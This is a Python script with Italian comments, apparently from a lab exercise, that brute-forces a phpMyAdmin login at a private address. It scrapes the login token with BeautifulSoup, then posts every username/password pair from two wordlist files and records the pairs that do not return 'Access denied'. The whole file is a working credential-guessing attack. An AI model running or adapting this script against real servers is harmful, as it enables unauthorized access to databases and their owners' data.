import requests
from bs4 import BeautifulSoup


# Apre i file conteneti le username e password
username_file = open("file/user.txt")
password_file = open("file/psw.txt")

# Legge il contenuto dei file e inserisci in liste
user_list = username_file.readlines()
pwd_list = password_file.readlines()

# Url da cui ottenere il token e il phpmyadmin
url = 'http://192.168.50.101/phpMyAdmin/'  

# Creazione sessione
session = requests.Session()


# Funzione per ottenere il token e il phpmyadmin
def extract_values(url, session):
    
    # Effettua una richiesta GET alla pagina web utilizzando la sessione
    response = session.get(url)

    # Verifica che la richiesta sia andata a buon fine (status code 200)
    if response.status_code == 200:
        # Analizza il contenuto HTML della risposta utilizzando BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Trova il tag <input> con name='token' e estrae il suo valore 'value'
        token_tag = soup.find('input', {'name': 'token'})
        if token_tag:
            ex_token = token_tag.get('value')
        else:
            print("Token non trovato nella pagina.")
            return None
    else:
        print(f"Errore nella richiesta GET: {response.status_code} - {response.reason}")
        return None

    # Restituiamo il dizionario contenente i valori estrati    
    return ex_token       

# Funzione brute force
def brute_force(url, session):
    
    # DIzionario contenente username e password 
    dati = { 
            'pma_username': '',
            'pma_password': '',
        }

    # variabile per tenere traccia dei tentativi fatti
    n_attempt = 0
    # Lista contenente le credenziali trovate
    credentials_list = []

    # Istruzioni per ciclare username e password
    for user in user_list:
        user =  user.rstrip()
        for pwd in pwd_list:
            pwd = pwd.rstrip()
            dati["pma_username"] = user
            dati["pma_password"] = pwd
        
            n_attempt+=1
            print(f"Combinazione N: {n_attempt}")

            # Post 
            response = session.post(url, dati)
            # Controllo risutato POST
            if response.text.find('Access denied for user') == -1:
                    credentials_list.append((user, pwd))    
                    
    # Restituisce una lista contenenti le credenziali trovate                
    return credentials_list


# Chiamata della funzione neccessaria ad estrare token e phpmyadin 
token = extract_values(url, session)
    
# COntrolla se token e phpmyadmin sono stati trovati    
if token != '':
    # Url ottenuto con token e phpmyadmin
    new_url = f'http://192.168.50.101/phpMyAdmin/index.php?token={token}'
    # Lista contenente gli user e password trovati
    list = brute_force(new_url, session)

for item in list:
    print(item)
